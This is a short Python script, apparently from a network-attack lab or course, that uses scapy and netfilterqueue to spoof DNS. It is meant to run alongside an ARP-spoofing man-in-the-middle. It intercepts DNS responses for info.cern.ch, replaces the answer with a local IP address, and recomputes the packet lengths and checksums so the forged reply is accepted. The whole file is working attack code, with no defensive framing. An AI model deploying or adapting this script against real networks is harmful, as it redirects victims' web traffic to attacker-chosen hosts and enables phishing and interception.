#!/usr/bin/env python3
#------------------------------------------------------
# to be run concurrently with arp_spoof,iptables config
#------------------------------------------------------
import scapy.all as scapy
import netfilterqueue
#import scapy_http.http
#from scapy_http import http
import argparse
import time
# def get_arguments():
#     parser = argparse.ArgumentParser()
#     parser.add_argument("-t","--target",help="Single Target IP")
#     options= parser.parse_args()
#     return options
#
false_target_ip ="10.0.2.4" # index.html in local: desired (spoofed)ip to be returned by the DNS call
#
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # convert to scapy packet    
    if scapy_packet.haslayer(scapy.DNSRR):  # DNS response
        #print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        if "info.cern.ch" in qname.decode(): # pure http site
            print("..Spoofing target..")
            answer = scapy.DNSRR(rrname=qname,rdata=false_target_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            #
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            #
            #packet.set_payload(str(scapy_packet))
            packet.set_payload(bytes(scapy_packet))
    packet.accept()
#main
queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()   